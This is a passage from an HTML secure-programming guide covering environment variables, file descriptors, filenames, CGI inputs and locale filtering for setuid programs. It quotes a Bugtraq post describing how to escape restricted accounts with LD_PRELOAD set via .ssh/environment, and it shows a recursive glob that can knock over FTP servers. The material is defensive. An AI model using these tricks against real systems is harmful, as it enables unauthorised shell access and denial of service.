must not trust the name of the program reported by command line argument zero
(an attacker can set it to any value including NULL).</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="ENVIRONMENT-VARIABLES"
>5.4. Environment Variables</A
></H2
><P
>By default, environment variables are inherited from a process&#8217; parent.
However, when a program executes another program, the calling program
can set the environment variables to arbitrary values.
This is dangerous to setuid/setgid programs, because their invoker can
completely control the environment variables they&#8217;re given.
Since they are usually inherited, this also applies transitively; a
secure program might call some other program and, without special measures,
would pass potentially dangerous environment variables values on to the
program it calls.
The following subsections discuss environment variables and what to
do with them.</P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="ENV-VARS-DANGEROUS"
>5.4.1. Some Environment Variables are Dangerous</A
></H3
><P
>Some environment variables are dangerous because
many libraries and programs are controlled by environment
variables in ways that are obscure, subtle, or undocumented.
For example, the IFS variable is used by the <EM
>sh</EM
> and <EM
>bash</EM
>
shell to determine which characters separate command line arguments.
Since the shell is invoked by several low-level calls
(like system(3) and popen(3) in C, or the back-tick operator in Perl),
setting IFS to unusual values can subvert apparently-safe calls.
This behavior is documented in bash and sh, but it&#8217;s obscure;
many long-time users only know about IFS because of its use in breaking
security, not because it&#8217;s actually used very often for its intended purpose.
What is worse is that not all environment variables are documented, and
even if they are, those other programs may change and add dangerous
environment variables.
Thus, the only real solution (described below) is to select the ones you
need and throw away the rest.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="ENV-STORAGE-DANGEROUS"
>5.4.2. Environment Variable Storage Format is Dangerous</A
></H3
><P
>Normally, programs should use the standard access routines to access
environment variables.
For example, in C, you should get values
using getenv(3), set them using the
POSIX standard routine putenv(3) or the BSD extension setenv(3)
and eliminate environment variables using unsetenv(3).
I should note here that setenv(3) is implemented in Linux, too.</P
><P
>However, crackers need not be so nice; crackers can directly control the
environment variable data area passed to a program using execve(2).
This permits some nasty attacks, which can only be understood by
understanding how environment variables really work.
In Linux, you can see environ(5) for a summary how about environment variables
really work.
In short, environment variables are internally stored as a pointer to
an array of pointers to characters; this array is stored in order and
terminated by a NULL pointer (so you&#8217;ll know when the array ends).
The pointers to characters, in turn, each
point to a NIL-terminated string value of the form <SPAN
CLASS="QUOTE"
>&#8220;NAME=value&#8221;</SPAN
>.
This has several implications, for example, environment variable names
can&#8217;t include the equal sign, and neither the name nor value can have
embedded NIL characters.
However, a more dangerous implication of this format is that it allows
multiple entries with the same variable name, but with different values
(e.g., more than one value for SHELL).
While typical command shells prohibit doing this,
a locally-executing cracker can create such a situation using execve(2).</P
><P
>The problem with this storage format (and the way it&#8217;s set)
is that a program might check one of these values
(to see if it&#8217;s valid) but actually use a different one.
In Linux,
the GNU glibc libraries try to shield programs from this;
glibc 2.1&#8217;s implementation of getenv will always get the first matching
entry, setenv and putenv will always set the first matching entry, and
unsetenv will actually unset <EM
>all</EM
> of the matching entries
(congratulations to the GNU glibc implementers for implementing
unsetenv this way!).
However, some programs go directly to the environ variable and iterate
across all environment variables; in this case,
they might use the last matching entry instead of the first one.
As a result, if checks were made against the first matching entry instead,
but the actual value used is the last matching entry,
a cracker can use this fact to circumvent the protection routines.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="ENV-VAR-SOLUTION"
>5.4.3. The Solution - Extract and Erase</A
></H3
><P
>For secure setuid/setgid programs, the short list of environment variables
needed as input (if any) should be carefully extracted.
Then the entire environment should be erased,
followed by resetting a small set of necessary environment
variables to safe values.
There really isn&#8217;t a better way if you make any calls to subordinate
programs; there&#8217;s no practical
method of listing <SPAN
CLASS="QUOTE"
>&#8220;all the dangerous values&#8221;</SPAN
>.
Even if you reviewed the source code of every program you call
directly or indirectly,
someone may add new undocumented environment variables after you
write your code, and one of them may be exploitable.</P
><P
>The simple way to erase the environment in C/C++
is by setting the global variable
<EM
>environ</EM
>
to NULL.
The global variable environ is defined in &#60;unistd.h&#62;; C/C++ users will
want to #include this header file.
You will need to manipulate this value before spawning threads, but that&#8217;s
rarely a problem, since you want to do these manipulations very early in
the program&#8217;s execution (usually before threads are spawned).</P
><P
>The global variable environ&#8217;s definition is defined in various standards; it&#8217;s
not clear that the official standards condone directly changing its value,
but I&#8217;m unaware of any Unix-like system that has trouble
with doing this.
I normally just modify the <SPAN
CLASS="QUOTE"
>&#8220;environ&#8221;</SPAN
> directly;
manipulating such low-level components is possibly non-portable, but 
it assures you that you get a clean (and safe) environment.
In the rare case where you need later access to the entire set of
variables, you could save the <SPAN
CLASS="QUOTE"
>&#8220;environ&#8221;</SPAN
> variable&#8217;s value somewhere,
but this is rarely necessary; nearly all programs need only a few values,
and the rest can be dropped.</P
><P
>Another way to clear the environment
is to use the undocumented clearenv() function.
The function
clearenv() has an odd history; it was supposed to be defined in POSIX.1, but
somehow never made it into that standard.
However, clearenv() is defined in POSIX.9
(the Fortran 77 bindings to POSIX), so there is a quasi-official status for it.
In Linux,
clearenv() is defined in &#60;stdlib.h&#62;, but before using #include
to include it you must make sure that __USE_MISC is #defined.
A somewhat more <SPAN
CLASS="QUOTE"
>&#8220;official&#8221;</SPAN
> approach is to cause __USE_MISC to be defined
is to first #define either _SVID_SOURCE or _BSD_SOURCE, and then
#include &#60;features.h&#62; -
these are the official feature test macros.</P
><P
>One environment value you&#8217;ll almost certainly re-add is PATH,
the list of directories to search for programs; PATH should
<EM
>not</EM
> include the current directory and usually be something simple like
<SPAN
CLASS="QUOTE"
>&#8220;/bin:/usr/bin&#8221;</SPAN
>.
Typically you&#8217;ll also set
IFS (to its default of <SPAN
CLASS="QUOTE"
>&#8220; \t\n&#8221;</SPAN
>, where space is the first character)
and TZ (timezone).
Linux won&#8217;t die if you don&#8217;t supply either IFS or TZ,
but some System V based systems have problems if you don&#8217;t supply a TZ value,
and it&#8217;s rumored that some shells need the IFS value set.
In Linux, see environ(5) for a list of common environment variables that you
<EM
>might</EM
> want to set.</P
><P
>If you really need user-supplied values, check the values first
(to ensure that the values match a pattern for legal values and that they
are within some reasonable maximum length).
Ideally there would be some standard trusted file in /etc with the
information for <SPAN
CLASS="QUOTE"
>&#8220;standard safe environment variable values&#8221;</SPAN
>,
but at this time there&#8217;s no standard file defined for this purpose.
For something similar, you might want to examine the PAM module pam_env
on those systems which have that module.
If you allow users to set an arbitrary environment variable, then you&#8217;ll
let them subvert restricted shells (more on that below).</P
><P
>If you&#8217;re using a shell as your programming language,
you can use the <SPAN
CLASS="QUOTE"
>&#8220;/usr/bin/env&#8221;</SPAN
> program with the <SPAN
CLASS="QUOTE"
>&#8220;-&#8221;</SPAN
> option
(which erases all environment variables of the program being run).
Basically, you call /usr/bin/env, give it the <SPAN
CLASS="QUOTE"
>&#8220;-&#8221;</SPAN
> option,
follow that with the set of variables and their values you wish to set
(as name=value),
and then follow that with the name of the program to run and its arguments.
You usually want to call the program using the full pathname
(/usr/bin/env) and not just as <SPAN
CLASS="QUOTE"
>&#8220;env&#8221;</SPAN
>, in case a user has created
a dangerous PATH value.
Note that GNU&#8217;s env also accepts the options
"-i" and "--ignore-environment" as synonyms (they also erase the
environment of the program being started), but these aren&#8217;t portable to
other versions of env.</P
><P
>If you&#8217;re programming a setuid/setgid program in a language
that doesn&#8217;t allow you to reset the environment directly,
one approach is to create a <SPAN
CLASS="QUOTE"
>&#8220;wrapper&#8221;</SPAN
> program.
The wrapper sets the environment program to safe values, and then
calls the other program.
Beware: make sure the wrapper will actually invoke the intended program;
if it&#8217;s an interpreted program, make sure there&#8217;s no race condition possible
that would allow the interpreter to load a different program than the one
that was granted the special setuid/setgid privileges.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="ENV-VAR-DONTSET"
>5.4.4. Don&#8217;t Let Users Set Their Own Environment Variables</A
></H3
><P
>If you allow users to set their own environment variables,
then users will be able to escape out of restricted accounts
(these are accounts that are supposed to only let
the users run certain programs and not work as a general-purpose machine).
This includes letting users write or modify certain files in their home
directory (e.g., like .login),
supporting conventions that load in environment variables from
files under the user&#8217;s control (e.g., openssh&#8217;s .ssh/environment file),
or supporting protocols that transfer environment variables
(e.g., the Telnet Environment Option; see CERT Advisory CA-1995-14
for more).
Restricted accounts should never be allowed to modify or add any 
file directly contained in their home directory, and instead should be
given only a specific subdirectory that they are allowed to modify
(if they can modify any).</P
><P
>ari posted a detailed discussion of this problem on Bugtraq
on June 24, 2002:
<A
NAME="AEN1144"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>Given the similarities with certain other security issues, i'm surprised
this hasn&#8217;t been discussed earlier.  If it has, people simply haven&#8217;t
paid it enough attention.</P
><P
>This problem is not necessarily ssh-specific, though most telnet daemons
that support environment passing should already be configured to remove
dangerous variables due to a similar (and more serious) issue back in
'95 (ref: [1]).  I will give ssh-based examples here.</P
><P
>Scenario one:
Let&#8217;s say admin bob has a host that he wants to give people ftp access
to.  Bob doesn&#8217;t want anyone to have the ability to actually _log into_
his system, so instead of giving users normal shells, or even no shells,
bob gives them all (say) /usr/sbin/nologin, a program he wrote himself
in C to essentially log the attempt to syslog and exit, effectively
ending the user&#8217;s session.  As far as most people are concerned, the
user can&#8217;t do much with this aside from, say, setting up an encrypted
tunnel.</P
><P
>The thing is, bob&#8217;s system uses dynamic libraries (as most do), and
/usr/sbin/nologin is dynamically linked (as most such programs are).  If
a user can set his environment variables (e.g. by uploading a
<SPAN
CLASS="QUOTE"
>&#8220;.ssh/environment&#8221;</SPAN
>
file) and put some arbitrary file on the system (e.g.
<SPAN
CLASS="QUOTE"
>&#8220;doevilstuff.so&#8221;</SPAN
>),
he can bypass any functionality of /usr/sbin/nologin
completely via LD_PRELOAD (or another member of the LD_* environment
family).</P
><P
>The user can now gain a shell on the system (with his own privileges, of
course, barring any <SPAN
CLASS="QUOTE"
>&#8220;UseLogin&#8221;</SPAN
>
issues (ref: [2])), and administrator
bob, if he were aware of what just occurred, would be extremely unhappy.</P
><P
>Granted, there are all kinds of interesting ways to (more or less) do
away with this problem.  Bob could just grit his teeth and give the ftp
users a nonexistent shell, or he could statically compile nologin,
assuming his operating system comes with static libraries.  Bob could
also, humorously, make his nologin program setuid and let the standard C
library take care of the situation.  Then, of course, there are also the
ssh-specific access controls such as AllowGroup and AllowUsers.  These
may appease the situation in this scenario, but it does not correct the
problem.</P
><P
>... Now, what happens if bob, instead of using /usr/sbin/nologin, wants to
use (for example) some BBS-type interface that he wrote up or
downloaded?  It can be a script written in perl or tcl or python, or it
could be a compiled program; doesn&#8217;t matter.  Additionally, bob need not
be running an ftp server on this host; instead, perhaps bob uses nfs or
veritas to mount user home directories from a fileserver on his network;
this exact setup is (unfortunately) employed by many bastion hosts,
password management hosts and mail servers---to name a few.  Perhaps bob
runs an ISP, and replaces the user&#8217;s shell when he doesn&#8217;t pay.  With
all of these possible (and common) scenarios, bob&#8217;s going to have a
somewhat more difficult time getting around the problem.</P
><P
>... Exploitation of the problem is simple.  The circumvention code would be
compiled into a dynamic library and LD_PRELOAD=/path/to/evil.so should
be placed into ~user/.ssh/environment (a similar environment option may
be appended to public keys in the authohrized_keys file).  If no
dynamically loadable programs are executed, this will have no effect.</P
><P
>ISPs and universities (along with similarly affected organizations)
should compile their rejection (or otherwise restricted) binaries
statically (assuming your operating system comes with static libraries)...</P
><P
>Ideally, sshd (and all remote access programs that allow user-definable
environments) should strip any environment settings that libc ignores
for setuid programs.</P
></BLOCKQUOTE
></P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="FILE-DESCRIPTORS"
>5.5. File Descriptors</A
></H2
><P
>A program is passed a set of <SPAN
CLASS="QUOTE"
>&#8220;open file descriptors&#8221;</SPAN
>, that is,
pre-opened files.
A setuid/setgid program must deal with the fact that the user gets to
select what files are open and to what (within their permission limits).
A setuid/setgid program must not assume that opening a new file will always
open into a fixed file descriptor id, or that the open will succeed at all.
It must also not assume that standard input (stdin),
standard output (stdout), and standard error (stderr)
refer to a terminal or are even open.</P
><P
>The rationale behind this is easy; since an attacker can open or
close a file descriptor before starting the program,
the attacker could create an unexpected situation.
If the attacker closes the standard output, when the program opens
the next file it will be opened as though it were standard output,
and then it will send all standard output to that file as well.
Some C libraries will automatically open stdin, stdout, and stderr
if they aren&#8217;t already open (to /dev/null), but this isn&#8217;t true on
all Unix-like systems.
Also, these libraries can&#8217;t be completely depended on; for example,
on some systems it&#8217;s possible to create a race condition
that causes this automatic opening to fail (and still run the program).</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="FILE-NAMES"
>5.6. File Names</A
></H2
><P
>The names of files can, in certain circumstances, cause serious problems.
This is especially a problem for secure programs that run on computers
with local untrusted users, but this isn&#8217;t limited to that circumstance.
Remote users may be able to trick a program into creating undesirable
filenames (programs should prevent this, but not all do), or remote
users may have partially penetrated a system and try using this trick
to penetrate the rest of the system.</P
><P
>Usually you will want to not include <SPAN
CLASS="QUOTE"
>&#8220;..&#8221;</SPAN
>
(higher directory) as a legal value from an untrusted user, though
that depends on the circumstances.
You might also want to list only the characters you will permit, and
forbidding any filenames that don&#8217;t match the list.
It&#8217;s best to prohibit any change in directory, e.g., by not
including <SPAN
CLASS="QUOTE"
>&#8220;/&#8221;</SPAN
> in the set of legal characters, if you&#8217;re taking data
from an external user and transforming it into a filename.</P
><P
>Often you shouldn&#8217;t support <SPAN
CLASS="QUOTE"
>&#8220;globbing&#8221;</SPAN
>, that is,
expanding filenames using <SPAN
CLASS="QUOTE"
>&#8220;*&#8221;</SPAN
>, <SPAN
CLASS="QUOTE"
>&#8220;?&#8221;</SPAN
>, <SPAN
CLASS="QUOTE"
>&#8220;[&#8221;</SPAN
> (matching <SPAN
CLASS="QUOTE"
>&#8220;]&#8221;</SPAN
>),
and possibly <SPAN
CLASS="QUOTE"
>&#8220;{&#8221;</SPAN
> (matching <SPAN
CLASS="QUOTE"
>&#8220;}&#8221;</SPAN
>).
For example, the command <SPAN
CLASS="QUOTE"
>&#8220;ls *.png&#8221;</SPAN
> does a glob on <SPAN
CLASS="QUOTE"
>&#8220;*.png&#8221;</SPAN
> to list
all PNG files.
The C fopen(3) command (for example) doesn&#8217;t do globbing, but the command
shells perform globbing by default, and in C you can request globbing
using (for example) glob(3).
If you don&#8217;t need globbing, just use the calls that don&#8217;t do it where
possible (e.g., fopen(3)) and/or disable them
(e.g., escape the globbing characters in a shell).
Be especially careful if you want to permit globbing.
Globbing can be useful, but complex globs can take a great deal of computing
time.
For example, on some ftp servers, performing a few of these requests can
easily cause a denial-of-service of the entire machine:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>ftp&#62; ls */../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*</PRE
></FONT
></TD
></TR
></TABLE
>
Trying to allow globbing, yet limit globbing patterns, is probably futile.
Instead, make sure that any such programs run as a separate process and
use process limits to limit the amount of CPU and other resources
they can consume.
See <A
HREF="#MINIMIZE-RESOURCES"
>Section 7.4.8</A
> for more information on this
approach, and see <A
HREF="#QUOTAS"
>Section 3.6</A
> for more information
on how to set these limits.</P
><P
>Unix-like systems generally forbid including the NIL character in a filename
(since this marks the end of the name) and the <SPAN
CLASS="QUOTE"
>&#8220;/&#8221;</SPAN
> character
(since this is the directory separator).
However, they often permit anything else, which is a problem;
it is easy to write programs that can be subverted by cleverly-created
filenames.</P
><P
>Filenames that can especially cause problems include:
<P
></P
><UL
><LI
><P
>Filenames with leading dashes (-).
If passed to other programs, this may cause the other programs to
misinterpret the name as option settings.
Ideally, Unix-like systems shouldn&#8217;t allow these filenames;
they aren&#8217;t needed and create many unnecessary security problems.
Unfortunately, currently developers have to deal with them.
Thus, whenever calling another program with a filename, insert
<SPAN
CLASS="QUOTE"
>&#8220;--&#8221;</SPAN
> before the filename parameters (to stop option processing, if
the program supports this common request) or modify the filename
(e.g., insert <SPAN
CLASS="QUOTE"
>&#8220;./&#8221;</SPAN
> in front of the filename to keep the dash from
being the lead character).</P
></LI
><LI
><P
>Filenames with control characters.
This especially includes newlines and carriage returns (which are
often confused as argument separators inside shell scripts, or can
split log entries into multiple entries) and the
ESCAPE character (which can interfere with terminal emulators, causing
them to perform undesired actions outside the user&#8217;s control).
Ideally, Unix-like systems shouldn&#8217;t allow these filenames either;
they aren&#8217;t needed and create many unnecessary security problems.</P
></LI
><LI
><P
>Filenames with spaces; these can sometimes confuse a shell into being
multiple arguments, with the other arguments causing problems.
Since other operating systems allow spaces in filenames (including
Windows and MacOS), for interoperability&#8217;s sake this will probably
always be permitted.
Please be careful in dealing with them, e.g., in the shell use
double-quotes around all filename parameters whenever calling another
program.
You might want to forbid leading and trailing spaces at least; these
aren&#8217;t as visible as when they occur in other places, and can confuse
human users.</P
></LI
><LI
><P
>Invalid character encoding.
For example, a program may believe that the filename is UTF-8 encoded,
but it may have an invalidly long UTF-8 encoding.
See <A
HREF="#CHARACTER-ENCODING-UTF8"
>Section 5.11.2</A
> for more information.
I&#8217;d like to see agreement on the character encoding used for filenames
(e.g., UTF-8), and then have the operating system enforce the encoding
(so that only legal encodings are allowed), but that hasn&#8217;t happened
at this time.</P
></LI
><LI
><P
>Another other character special to internal data formats, such as <SPAN
CLASS="QUOTE"
>&#8220;&#60;&#8221;</SPAN
>,
<SPAN
CLASS="QUOTE"
>&#8220;;&#8221;</SPAN
>, quote characters, backslash, and so on.</P
></LI
></UL
></P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="FILE-CONTENTS"
>5.7. File Contents</A
></H2
><P
>If a program takes directions from a file, it must not trust that file
specially unless only a trusted user can control its contents.
Usually this means that an untrusted user must not be able to modify the file,
its directory, or any of its ancestor directories.
Otherwise, the file must be treated as suspect.</P
><P
>If the directions in the file are supposed to be from an untrusted user,
then make sure that the inputs from the file are protected as describe
throughout this book.
In particular, check that values match the set of legal values, and that
buffers are not overflowed.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="WEB-APPS"
>5.8. Web-Based Application Inputs (Especially CGI Scripts)</A
></H2
><P
>Web-based applications (such as CGI scripts) run on some trusted
server and must get their
input data somehow through the web.
Since the input data generally come from untrusted users,
this input data must be validated.
Indeed, this information may have actually come from an untrusted third
party; see
<A
HREF="#CROSS-SITE-MALICIOUS-CONTENT"
>Section 7.16</A
> for more information.
For example, CGI scripts
are passed this information
through a standard set of environment variables and through standard input.
The rest of this text will specifically discuss CGI, because it&#8217;s
the most common technique for implementing dynamic web content, but
the general issues are the same for most other dynamic web content techniques.</P
><P
>One additional complication is that many CGI inputs are provided in
so-called <SPAN
CLASS="QUOTE"
>&#8220;URL-encoded&#8221;</SPAN
> format, that is, some values are written in the
format %HH where HH is the hexadecimal code for that byte.
You or your CGI library must handle these inputs correctly by
URL-decoding the input and then checking
if the resulting byte value is acceptable.
You must correctly handle all values, including problematic
values such as %00 (NIL) and %0A (newline).
Don&#8217;t decode inputs more than once, or input such as <SPAN
CLASS="QUOTE"
>&#8220;%2500&#8221;</SPAN
>
will be mishandled (the %25 would be translated to <SPAN
CLASS="QUOTE"
>&#8220;%&#8221;</SPAN
>, and the resulting
<SPAN
CLASS="QUOTE"
>&#8220;%00&#8221;</SPAN
> would be erroneously translated to the NIL character).</P
><P
>CGI scripts are commonly attacked by including special characters in their
inputs; see the comments above.</P
><P
>Another form of data available to web-based applications are <SPAN
CLASS="QUOTE"
>&#8220;cookies.&#8221;</SPAN
>
Again, users can provide arbitrary cookie values, so they cannot
be trusted unless special precautions are taken.
Also, cookies can be used to track users, potentially invading user privacy.
As a result, many users disable cookies, so if possible your web application
should be designed so that it does not require the use of cookies
(but see my later discussion for when you <EM
>must</EM
> authenticate
individual users).
I encourage you to avoid or limit the use of persistent cookies
(cookies that last beyond a current session), because they are easily abused.
Indeed, U.S. agencies are currently forbidden to use persistent cookies
except in special circumstances, because of the concern about
invading user privacy; see the
<A
HREF="http://cio.gov/files/lewfinal062200.pdf"
TARGET="_top"
>OMB guidance
in memorandum M-00-13 (June 22, 2000)</A
>.
<A
HREF="http://www.c3i.osd.mil/org/cio/doc/cookies.html"
TARGET="_top"
>Specific guidance about cookies applies to the U.S. Department of Defense (DoD)</A
>,
which is part of the
<A
HREF="http://www.defenselink.mil/webmasters"
TARGET="_top"
>DoD guidance to
webmasters</A
>.
Note that to use cookies, some browsers may insist that you
have a privacy profile (named p3p.xml on the root directory of the server).</P
><P
>Some HTML forms include client-side input checking
to prevent some illegal values; these are
typically implemented using Javascript/ECMAscript or Java.
This checking can be helpful for the user, since it can happen <SPAN
CLASS="QUOTE"
>&#8220;immediately&#8221;</SPAN
>
without requiring any network access.
However, this kind of input checking is useless for security, because
attackers can send such <SPAN
CLASS="QUOTE"
>&#8220;illegal&#8221;</SPAN
> values directly to the web server
without going through the checks.
It&#8217;s not even hard to subvert this; you don&#8217;t have to write
a program to send arbitrary data to a web application.
In general, servers must perform all their own input checking
(of form data, cookies, and so on) because
they cannot trust clients to do this securely.
In short, clients are generally not <SPAN
CLASS="QUOTE"
>&#8220;trustworthy channels&#8221;</SPAN
>.
See <A
HREF="#TRUSTWORTHY-CHANNELS"
>Section 7.12</A
>
for more information on trustworthy channels.</P
><P
>A brief discussion on input validation for those using Microsoft&#8217;s
Active Server Pages (ASP) is available from
Jerry Connolly at
<A
HREF="http://heap.nologin.net/aspsec.html"
TARGET="_top"
>http://heap.nologin.net/aspsec.html</A
></P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="OTHER-INPUTS"
>5.9. Other Inputs</A
></H2
><P
>Programs must ensure that all inputs are controlled; this is particularly
difficult for setuid/setgid programs because they have so many such inputs.
Other inputs programs must consider include the current directory,
signals, memory maps (mmaps), System V IPC, pending timers,
resource limits, the scheduling priority, and the umask (which determines
the default permissions of newly-created files).
Consider explicitly changing directories (using chdir(2)) to an appropriately
fully named directory at program startup.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="LOCALE"
>5.10. Human Language (Locale) Selection</A
></H2
><P
>As more people have computers and the Internet available to them, there
has been increasing pressure for programs
to support multiple human languages and cultures.
This combination of language and other cultural factors is usually called
a <SPAN
CLASS="QUOTE"
>&#8220;locale&#8221;</SPAN
>.
The process of modifying a program so it can support multiple locales
is called <SPAN
CLASS="QUOTE"
>&#8220;internationalization&#8221;</SPAN
> (i18n), and the process of providing
the information for a particular locale to a program is called
<SPAN
CLASS="QUOTE"
>&#8220;localization&#8221;</SPAN
> (l10n).</P
><P
>Overall, internationalization
is a good thing, but this process provides another opportunity
for a security exploit.
Since a potentially untrusted user provides information on the desired
locale, locale selection becomes another input that,
if not properly protected, can be exploited.</P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="HOW-LOCALES-SELECTED"
>5.10.1. How Locales are Selected</A
></H3
><P
>In locally-run programs (including setuid/setgid programs),
locale information is provided by an environment
variable.
Thus, like all other environment variables, these values
must be extracted and checked against valid patterns before use.</P
><P
>For web applications, this information can be obtained from the web
browser (via the Accept-Language request header).
However, since not all web browsers properly pass this information
(and not all users configure their browsers properly),
this is used less often than you might think.
Often, the language requested in a web browser
is simply passed in as a form value.
Again, these values must be checked for validity before use, as with
any other form value.</P
><P
>In either case, locale information is
really just a special case of input discussed in the previous sections.
However, because this input is so rarely considered,
I&#8217;m discussing it separately.
In particular,
when combined with format strings (discussed later), user-controlled
strings can permit attackers to force other programs to run
arbitrary instructions,
corrupt data, and do other unfortunate actions.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="LOCALE-SUPPORT-MECHANISMS"
>5.10.2. Locale Support Mechanisms</A
></H3
><P
>There are two major library interfaces for supporting locale-selected
messages on Unix-like systems,
one called <SPAN
CLASS="QUOTE"
>&#8220;catgets&#8221;</SPAN
> and the other called <SPAN
CLASS="QUOTE"
>&#8220;gettext&#8221;</SPAN
>.
In the catgets approach, every string is assigned a unique number, which
is used as an index into a table of messages.
In contrast,
in the gettext approach, a string (usually in English) is used to
look up a table that translates the original string.
catgets(3) is an accepted standard
(via the X/Open Portability Guide, Volume 3 and
Single Unix Specification),
so it&#8217;s possible your program uses it.
The <SPAN
CLASS="QUOTE"
>&#8220;gettext&#8221;</SPAN
> interface is not an official standard,
(though it was originally a UniForum proposal), but I believe it&#8217;s the
more widely used interface
(it&#8217;s used by Sun and essentially all GNU programs).</P
><P
>In theory, catgets should be slightly faster, but this is at best
marginal on today&#8217;s machines, and the bookkeeping effort to keep
unique identifiers valid in catgets() makes the gettext() interface
much easier to use.
I&#8217;d suggest using gettext(), just because it&#8217;s easier to use.
However, don&#8217;t take my word for it; see GNU&#8217;s documentation on gettext
(info:gettext#catgets) for a longer and more descriptive comparison.</P
><P
>The catgets(3) call (and its associated catopen(3) call)
in particular is vulnerable
to security problems, because the environment variable NLSPATH can be
used to control the filenames used to acquire internationalized messages.
The GNU C library ignores NLSPATH for setuid/setgid programs, which helps,
but that doesn&#8217;t protect programs running on other implementations, nor
other programs (like CGI scripts) which don&#8217;t <SPAN
CLASS="QUOTE"
>&#8220;appear&#8221;</SPAN
> to
require such protection.</P
><P
>The widely-used <SPAN
CLASS="QUOTE"
>&#8220;gettext&#8221;</SPAN
> interface is at least not
vulnerable to a malicious NLSPATH setting to my knowledge.
However, it appears likely to me that malicious settings of
LC_ALL or LC_MESSAGES could cause problems.
Also, if you use gettext&#8217;s bindtextdomain() routine in its file cat-compat.c,
that does depend on NLSPATH.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="LOCALE-LEGAL-VALUES"
>5.10.3. Legal Values</A
></H3
><P
>For the moment, if you must permit untrusted users to set information on
their desired locales, make sure the provided internationalization information
meets a narrow filter that only permits legitimate locale names.
For user programs (especially setuid/setgid programs), these values
will come in via NLSPATH, LANGUAGE, LANG, the old LINGUAS, LC_ALL, and
the other LC_* values (especially LC_MESSAGES, but also including
LC_COLLATE, LC_CTYPE, LC_MONETARY, LC_NUMERIC, and LC_TIME).
For web applications, this user-requested set of language information
would be done via the Accept-Language request header or a form value
(the application should indicate the actual language setting of the
data being returned via the Content-Language heading).
You can check this value as part of your environment variable filtering if
your users can set your environment variables (i.e., setuid/setgid
programs) or as part of your input filtering (e.g., for CGI scripts).
The GNU C library "glibc" doesn&#8217;t accept some values of LANG for
setuid/setgid programs (in particular anything with "/"),
but errors have been found in that filtering
(e.g., Red Hat released an update to fix this error in glibc
on September 1, 2000).
This kind of filtering isn&#8217;t required by any standard, so you&#8217;re
safer doing this filtering yourself.
I have not found any guidance on filtering language settings,
so here are my suggestions based on my own research into the issue.</P
><P
>First, a few words about the legal values of these settings.
Language settings are generally set using the standard tags defined
in IETF RFC 1766 (which uses two-letter country codes as its basic tag,
followed by an optional subtag separated by a dash; I&#8217;ve found that
environment variable settings use the underscore instead).
However, some find this insufficiently flexible, so three-letter country
codes may soon be used as well.
Also, there are two major not-quite compatible extended formats, the
X/Open Format and the CEN Format (European Community Standard);
you'd like to permit both.
Typical values include
<SPAN
CLASS="QUOTE"
>&#8220;C&#8221;</SPAN
> (the C locale), <SPAN
CLASS="QUOTE"
>&#8220;EN&#8221;</SPAN
> (English''),
and <SPAN
CLASS="QUOTE"
>&#8220;FR_fr&#8221;</SPAN
> (French using the territory of France&#8217;s conventions).
Also, so many people use nonstandard names that programs have had to develop
<SPAN
CLASS="QUOTE"
>&#8220;alias&#8221;</SPAN
> systems to cope with nonstandard names
(for GNU gettext, see /usr/share/locale/locale.alias, and for X11, see
/usr/lib/X11/locale/locale.alias; you might need "aliases" instead of "alias");
they should usually be permitted as well.
Libraries like gettext() have to accept all these variants and find an
appropriate value, where possible.
One source of further information is FSF [1999];
another source is the li18nux.org web site.
A filter should not permit characters that aren&#8217;t needed,
in particular <SPAN
CLASS="QUOTE"
>&#8220;/&#8221;</SPAN
> (which might permit escaping out of the trusted
directories) and <SPAN
CLASS="QUOTE"
>&#8220;..&#8221;</SPAN
> (which might permit going up one directory).
Other dangerous characters in NLSPATH
include <SPAN
CLASS="QUOTE"
>&#8220;%&#8221;</SPAN
> (which indicates substitution) and <SPAN
CLASS="QUOTE"
>&#8220;:&#8221;</SPAN
>
(which is the directory separator); the documentation I have for other
machines suggests that some implementations may use them for other values,
so it&#8217;s safest to prohibit them.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="LOCALE-BOTTOM-LINE"
>5.10.4. Bottom Line</A
></H3
><P
>In short, I suggest
simply erasing or re-setting the NLSPATH, unless you have a trusted user
supplying the value.
For the Accept-Language heading in HTTP (if you use it),
form values specifying the locale, and the environment variables
LANGUAGE, LANG, the old LINGUAS, LC_ALL, and the other LC_* values listed
above,
filter the locales from untrusted users to permit null (empty) values or
to only permit values that match in total this regular expression
(note that I&#8217;ve added <SPAN
CLASS="QUOTE"
>&#8220;=&#8221;</SPAN
>):
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> [A-Za-z][A-Za-z0-9_,+@\-\.=]*</PRE
></FONT
></TD
></TR
></TABLE
>
I haven&#8217;t found any legitimate locale which doesn&#8217;t match this pattern,
but this pattern does appear to protect against locale attacks.
Of course, there&#8217;s no guarantee that there are messages available
in the requested locale,
but in such a case these routines will fall back to the default
messages (usually in English), which at least is not a security problem.</P
><P
>If you wish to be really picky, and only patterns that match li18nux&#8217;s
